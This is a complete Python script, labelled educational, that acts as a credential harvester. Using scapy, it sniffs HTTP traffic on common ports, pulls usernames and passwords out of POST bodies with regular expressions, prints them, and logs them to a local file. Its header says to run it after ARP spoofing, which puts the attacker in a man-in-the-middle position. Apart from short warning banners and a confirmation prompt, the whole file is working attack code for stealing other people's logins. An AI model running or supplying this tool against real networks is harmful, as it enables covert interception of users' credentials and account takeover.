#!/usr/bin/env python3
"""
========================================
HTTP PACKET SNIFFER - CREDENTIAL HARVESTER
========================================
This script captures HTTP traffic and extracts credentials.

WHAT IT DOES:
1. Listens to network traffic
2. Filters for HTTP packets (port 80, 8080, etc.)
3. Extracts POST data containing credentials
4. Displays captured usernames and passwords

REQUIREMENTS:
- Must be in MITM position (use arp_spoof.py first)
- OR sniffing on the same network segment

‚ö†Ô∏è EDUCATIONAL PURPOSES ONLY ‚ö†Ô∏è
========================================
"""

from scapy.all import sniff, TCP, IP, Raw
import re
import sys
import os
import platform
import ctypes

# ========================================
# CONFIGURATION
# ========================================
INTERFACE = "\\Device\\NPF_Loopback"              # Network interface to sniff on
PORTS = [80, 8080, 8000, 3000]  # Common HTTP ports

# ========================================
# REGEX PATTERNS FOR CREDENTIAL EXTRACTION
# ========================================
# These patterns match common login forms
USERNAME_PATTERNS = [
    rb'username=([^&\s]+)',     # username=admin
    rb'user=([^&\s]+)',         # user=admin
    rb'login=([^&\s]+)',        # login=admin
    rb'email=([^&\s]+)',        # email=admin@example.com
]

PASSWORD_PATTERNS = [
    rb'password=([^&\s]+)',     # password=secret123
    rb'pass=([^&\s]+)',         # pass=secret123
    rb'pwd=([^&\s]+)',          # pwd=secret123
]

# ========================================
# CAPTURED CREDENTIALS STORAGE
# ========================================
captured_creds = []

# ========================================
# STEP 1: EXTRACT CREDENTIALS FROM PACKET
# ========================================
def extract_credentials(payload):
    """
    Extract username and password from HTTP POST data.

    Args:
        payload: Raw packet payload (bytes)

    Returns:
        tuple: (username, password) or (None, None)
    """
    username = None
    password = None

    # ========================================
    # TRY TO FIND USERNAME
    # ========================================
    for pattern in USERNAME_PATTERNS:
        match = re.search(pattern, payload)
        if match:
            # Decode the URL-encoded value
            username = match.group(1).decode('utf-8', errors='ignore')
            # URL decode (replace + with space, etc.)
            username = username.replace('+', ' ')
            break

    # ========================================
    # TRY TO FIND PASSWORD
    # ========================================
    for pattern in PASSWORD_PATTERNS:
        match = re.search(pattern, payload)
        if match:
            password = match.group(1).decode('utf-8', errors='ignore')
            password = password.replace('+', ' ')
            break

    return username, password

# ========================================
# STEP 2: ANALYZE HTTP PACKET
# ========================================
def analyze_http_packet(packet):
    """
    Analyze HTTP packet and extract interesting data.

    Args:
        packet: Scapy packet object
    """
    # ========================================
    # CHECK IF PACKET HAS RAW PAYLOAD
    # ========================================
    if not packet.haslayer(Raw):
        return

    try:
        # Get the raw payload
        payload = packet[Raw].load

        # ========================================
        # CHECK IF IT'S AN HTTP REQUEST OR DATA
        # ========================================
        is_http_request = payload.startswith(b'GET') or \
                          payload.startswith(b'POST') or \
                          payload.startswith(b'PUT')
        
        has_credentials = b'username=' in payload or b'password=' in payload
        
        # Skip if neither HTTP request nor credential data
        if not is_http_request and not has_credentials:
            return

        # ========================================
        # GET SOURCE AND DESTINATION INFO
        # ========================================
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        src_port = packet[TCP].sport
        dst_port = packet[TCP].dport

        # ========================================
        # PRINT HTTP REQUEST HEADER
        # ========================================
        print("\n" + "="*60)
        print(f"[+] HTTP Packet Captured!")
        print(f"    Source:      {src_ip}:{src_port}")
        print(f"    Destination: {dst_ip}:{dst_port}")
        print("="*60)

        # ========================================
        # TRY TO DECODE PAYLOAD
        # ========================================
        try:
            payload_str = payload.decode('utf-8', errors='ignore')
            # Only show first 500 characters
            if len(payload_str) > 500:
                payload_str = payload_str[:500] + "... [truncated]"

            print(f"\n[*] HTTP Request:\n{payload_str}\n")
        except:
            print("[*] Could not decode payload")

        # ========================================
        # LOOK FOR CREDENTIALS IN POST DATA
        # ========================================
        if b'POST' in payload:
            print("[!] POST request detected - checking for credentials...")

            username, password = extract_credentials(payload)

            if username and password:
                # ========================================
                # CREDENTIALS FOUND!
                # ========================================
                print("\n" + "üö®"*20)
                print("üéØ CREDENTIALS CAPTURED!")
                print("üö®"*20)
                print(f"Username: {username}")
                print(f"Password: {password}")
                print(f"Source:   {src_ip}")
                print(f"Time:     {packet.time}")
                print("üö®"*20 + "\n")

                # Store the credentials
                cred_entry = {
                    'username': username,
                    'password': password,
                    'source_ip': src_ip,
                    'dest_ip': dst_ip,
                    'timestamp': packet.time
                }
                captured_creds.append(cred_entry)

                # Save to file
                save_credentials(cred_entry)
            else:
                print("[*] POST data present but no credentials found")

    except Exception as e:
        # Silently ignore errors in packet processing
        # (some packets may be malformed or encrypted)
        pass

# ========================================
# STEP 3: SAVE CREDENTIALS TO FILE
# ========================================
def save_credentials(cred):
    """
    Save captured credentials to a file for later analysis.

    Args:
        cred: Dictionary with credential data
    """
    try:
        with open('captured_credentials.txt', 'a') as f:
            f.write("="*60 + "\n")
            f.write(f"Timestamp: {cred['timestamp']}\n")
            f.write(f"Source IP: {cred['source_ip']}\n")
            f.write(f"Dest IP:   {cred['dest_ip']}\n")
            f.write(f"Username:  {cred['username']}\n")
            f.write(f"Password:  {cred['password']}\n")
            f.write("="*60 + "\n\n")

        print("[+] Credentials saved to 'captured_credentials.txt'")
    except Exception as e:
        print(f"[-] Error saving credentials: {e}")

# ========================================
# STEP 4: PACKET SNIFFER FILTER
# ========================================
def packet_filter(packet):
    """
    Filter function for scapy.sniff()
    Only process packets we're interested in.

    Args:
        packet: Scapy packet

    Returns:
        bool: True if packet should be processed
    """
    # Only look at TCP packets
    if not packet.haslayer(TCP):
        return False

    # Only look at specific ports (common HTTP ports)
    dport = packet[TCP].dport
    sport = packet[TCP].sport

    return dport in PORTS or sport in PORTS

# ========================================
# STEP 5: START SNIFFING
# ========================================
def start_sniffing(interface):
    """
    Start capturing network packets.

    Args:
        interface: Network interface to sniff on
    """
    print("="*60)
    print("üé£ HTTP PACKET SNIFFER - CREDENTIAL HARVESTER")
    print("="*60)
    print(f"[*] Interface: {interface}")
    print(f"[*] Monitoring ports: {PORTS}")
    print(f"[*] Press Ctrl+C to stop")
    print("="*60)
    print("\n[*] Listening for HTTP traffic...\n")

    try:
        # ========================================
        # START PACKET CAPTURE
        # ========================================
        # sniff() captures packets
        # prn=analyze_http_packet ‚Üí calls our function for each packet
        # lfilter=packet_filter ‚Üí only captures packets matching our filter
        # store=0 ‚Üí don't store packets in memory (saves RAM)
        sniff(
            iface=interface,
            prn=analyze_http_packet,
            lfilter=packet_filter,
            store=0
        )

    except KeyboardInterrupt:
        # ========================================
        # USER STOPPED THE SNIFFER
        # ========================================
        print("\n\n[!] Sniffing stopped by user")
        print_summary()

    except PermissionError:
        print("\n[-] Permission denied!")
        print("[-] Run with: sudo python3 packet_sniffer.py")
        sys.exit(1)

    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)

# ========================================
# STEP 6: PRINT SUMMARY
# ========================================
def print_summary():
    """
    Print summary of captured credentials.
    """
    print("\n" + "="*60)
    print("üìä CAPTURE SUMMARY")
    print("="*60)

    if captured_creds:
        print(f"\n[+] Total credentials captured: {len(captured_creds)}\n")

        for i, cred in enumerate(captured_creds, 1):
            print(f"{i}. Username: {cred['username']:20} | Password: {cred['password']:20} | IP: {cred['source_ip']}")

        print(f"\n[+] All credentials saved to: captured_credentials.txt")
    else:
        print("\n[*] No credentials captured")

    print("="*60)

# ========================================
# MAIN FUNCTION
# ========================================
def main():
    """
    Main entry point.
    """
    # ========================================
    # CHECK FOR ROOT/ADMIN PRIVILEGES
    # ========================================
    def is_admin():
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0

    if not is_admin():
        print("[-] This script requires root/administrator privileges")
        print("[-] Run with: sudo python3 packet_sniffer.py")
        sys.exit(1)

    # ========================================
    # START SNIFFING
    # ========================================
    start_sniffing(INTERFACE)

if __name__ == "__main__":
    # ========================================
    # DISPLAY WARNING
    # ========================================
    print("\n" + "‚ö†Ô∏è "*20)
    print("WARNING: Packet sniffing without permission is ILLEGAL!")
    print("This tool is for EDUCATIONAL purposes in controlled labs only!")
    print("‚ö†Ô∏è "*20 + "\n")

    response = input("Do you understand and want to continue? (yes/no): ")
    if response.lower() != 'yes':
        print("Exiting...")
        sys.exit(0)

    main()
